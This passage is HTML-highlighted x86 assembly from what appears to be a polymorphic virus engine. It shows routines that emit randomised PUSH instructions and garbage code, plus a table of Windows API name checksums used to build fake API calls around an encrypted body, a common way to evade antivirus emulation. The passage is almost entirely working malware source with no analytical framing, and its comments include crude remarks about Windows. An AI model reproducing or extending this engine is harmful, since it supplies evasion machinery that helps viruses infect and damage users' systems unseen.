</span><span class="sc5">PushParameter</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Random</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Handle</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Buffer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@BufferSize</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Flags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Null</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@VirtualPointer</span><span class="sc0">
     </span><span class="sc5">@@VirtualSize</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
    </span><span class="sc5">@@VirtualPointer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3FE0h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
    </span><span class="sc5">@@Random</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@RandomByte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@RandomByte</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@RandomByte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@Handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@Buffer</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnAddressHigh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@BufferSize</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@Byte</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@ByteByte</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
         </span><span class="sc5">@@ByteByte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@Null</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006Ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@Flags</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
         </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PushParameter</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">APICall_RestoreStack</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APICall_StackOrder</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">APICall_StackedRegs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Loop01</span><span class="sc0">
       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">APICall_RestoreStack</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; API information</span><span class="sc0">
</span><span class="sc1">;; Each API information has the next format:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; +00: Checksum of API name (DWORD)</span><span class="sc0">
</span><span class="sc1">;; +04: Virtual address that will have in file, 0 if not available/imported</span><span class="sc0">
</span><span class="sc1">;; +08-09-0A: Parameters in standard order (in reverse-PUSHing order):</span><span class="sc0">
</span><span class="sc1">;;            0=No parameter (last one)</span><span class="sc0">
</span><span class="sc1">;;            1=Random number</span><span class="sc0">
</span><span class="sc1">;;            2=Pseudo-handle</span><span class="sc0">
</span><span class="sc1">;;            3=Buffer address (beware with frame)</span><span class="sc0">
</span><span class="sc1">;;            4=Buffer size</span><span class="sc0">
</span><span class="sc1">;;            5=Number between 0 and 255</span><span class="sc0">
</span><span class="sc1">;;            6=Pseudo-flags</span><span class="sc0">
</span><span class="sc1">;;            7=NULL</span><span class="sc0">
</span><span class="sc1">;;            8=Any virtual address (for IsBad* funcs)</span><span class="sc0">
</span><span class="sc1">;;            9=Virtual size (for IsBad* funcs)</span><span class="sc0">
</span><span class="sc1">;; +0B: byte: Value returning check: 0=0, 1=-1, 2=Boolean, 3=Void or random</span><span class="sc0">
</span><span class="sc1">;;                                                           (no check)</span><span class="sc0">
</span><span class="sc1">;; +0C: Reserved</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">

</span><span class="sc5">APIInfo</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">  </span><span class="sc1">;; There are 32 API information blocks, ordered</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCommandLineaA(void) ; in frequency of use (in my opinion) in an</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">009654E3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; application</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; void GetStartupInfoA(Pointer)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">009DB67Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetEnvironmentStrings(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">14F02D92h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetVersion(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00217C32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetModuleHandleA(Pointer)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0FFFFFFFFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; dd      0005CD63h, 0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Disabled. The fucking Windblows hangs the program</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; if there is any problem with the pointer, instead of</span><span class="sc0">
                       </span><span class="sc1">; returning an error</span><span class="sc0">
</span><span class="sc1">;; DWORD GetModuleFileNameA(Handle,Buffer,Buffer_Size)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00B83717h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD MulDiv(Random,Random,Random)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000007EAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetACP(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000BEBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetOEMCP(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000090CBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCPInfo(CodePage,Buffer)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0004C11Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetStdHandle(Flags)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00004C91h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetLastError(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0038408Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; void GetLocalTime(Buffer)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00037E63h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; void GetSystemInfo(Buffer)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0125711Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCurrentProcess(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">46C8D729h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCurrentProcessID(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">8D91AE5Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCurrentThread(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0048DF27h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCurrentThreadID(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0091BE43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetConsoleCP(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">025AF28Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
